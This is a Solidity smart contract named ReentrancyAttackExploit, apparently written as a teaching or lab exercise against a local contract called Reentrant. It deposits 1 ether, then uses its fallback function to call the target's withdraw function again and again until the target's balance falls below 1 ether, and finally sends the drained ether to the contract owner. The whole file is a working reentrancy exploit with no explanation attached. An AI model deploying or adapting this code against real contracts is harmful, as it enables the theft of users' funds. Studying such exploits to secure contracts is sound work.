// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Reentrant.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract ReentrancyAttackExploit is Ownable {

    Reentrant public vulnerable;

    constructor(address _target) {
        vulnerable = Reentrant(_target);
    }

    // Fallback is called when vulnerable sends Ether to this contract.
    fallback() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    function attack() public payable onlyOwner {
        require(msg.value >= 1 ether, "Send more eth");
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    function withdraw() public onlyOwner{
        uint amount = address(this).balance;
        require(amount > 0);
        (bool sent, ) = owner().call{value: amount}("");
        require(sent, "Failed to send Ether");
    }


}

